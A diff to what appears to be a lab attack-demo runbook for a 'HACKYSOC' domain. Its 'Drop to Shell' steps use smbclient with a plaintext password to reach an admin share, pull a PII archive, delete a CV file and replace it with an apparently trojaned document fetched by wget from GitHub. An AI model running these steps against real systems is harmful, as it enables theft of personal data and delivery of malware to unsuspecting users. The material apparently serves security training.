@@ -39,28 +39,23 @@ Find Upload section:
 
 Drop to Shell:
 =================
-Show rest of demo and malware deployment.\
-	Execute pii script\
-	Show pii data pulled from windows machine\
-    Show Roger DOC\
-        smbclient '//192.168.122.7/c$' -W HACKYSOC -U wier%frantic-Folly3\
-    pull roger doc at CLI\
-        smbclient '//192.168.122.7/Private_Files' -c 'lcd /var/tmp; get PII.zip' -W HACYSOC -U wier%frantic-Folly3\
-    Push new DOC to FileShare
-        smbclient '//192.168.122.7/c$' -W HACKYSOC -U wier%frantic-Folly3\
-        Browse to Roger DOC in Private_Files\
-        del rogeradamsCV.doc\
-        exit\
-        cd /var/tmp\
+Show rest of demo and malware deployment. \
+	Execute pii script \
+	Show pii data pulled from windows machine \
+    Show Roger DOC \
+        smbclient '//192.168.122.7/c$' -W HACKYSOC -U wier%frantic-Folly3 \
+    pull roger doc at CLI \
+        smbclient '//192.168.122.7/Private_Files' -c 'lcd /var/tmp; get PII.zip' -W HACYSOC -U wier%frantic-Folly3 \
+    Push new DOC to FileShare \
+        smbclient '//192.168.122.7/c$' -W HACKYSOC -U wier%frantic-Folly3 \
+        Browse to Roger DOC in Private_Files \
+        del rogeradamsCV.doc \
+        exit \
+        cd /var/tmp \
         wget https://github.com/rnewt6926/Ingram/blob/main/rogeradamsCV.doc \
-        smbclient '//192.168.122.7/Private_Files' -c 'lcd /var/tmp; put rogeradamsCV.doc' -W HACKYSOC -U wier%frantic-Folly3\
-
-
-
-
+        smbclient '//192.168.122.7/Private_Files' -c 'lcd /var/tmp; put rogeradamsCV.doc' -W HACKYSOC -U wier%frantic-Folly3 \
 
 
 Wrap up:
 ========
-
-Narrative
+    Now we wait \
